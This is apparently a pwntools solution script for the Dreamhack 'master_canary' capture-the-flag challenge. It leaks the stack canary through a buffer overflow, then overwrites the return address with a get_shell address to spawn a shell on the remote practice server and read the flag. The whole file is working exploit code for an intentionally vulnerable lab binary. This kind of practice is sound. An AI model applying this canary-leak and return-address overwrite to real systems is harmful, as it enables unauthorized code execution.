from pwn import*

context.log_level       = "DEBUG"
context.arch            = "amd64"
#p = process("./master_canary")
p = remote("host3.dreamhack.games", 12613)
#gdb.attach(p,api=True)

#######################
# STEP_1: Leak_canary #
#######################
p.recvuntil(b"> ")
p.sendline(b"1")
p.recvuntil(b"> ")
p.sendline(b"2")
p.recvuntil(b"Size: ")
p.sendline(str(0x8e9)) #0x929
p.recvuntil(b"Data: ")

payload = b"a"*0x8e9   #0x929
p.sendline(payload)

p.recvuntil(payload)

canary = int.from_bytes(p.recv(7), "little") << 2*4
print("[+]Canary:",hex(canary))

###################
# STEP_1: Exploit #
###################
p.sendline(b"3")
get_shell = 0x0000000000400a4a
p.recvuntil(b"Leave comment: ")
payload =b"a"*0x28 + p64(canary) + b"a"*8 + p64(get_shell)
p.sendline(payload)

p.sendline(b"cat flag")
p.interactive()

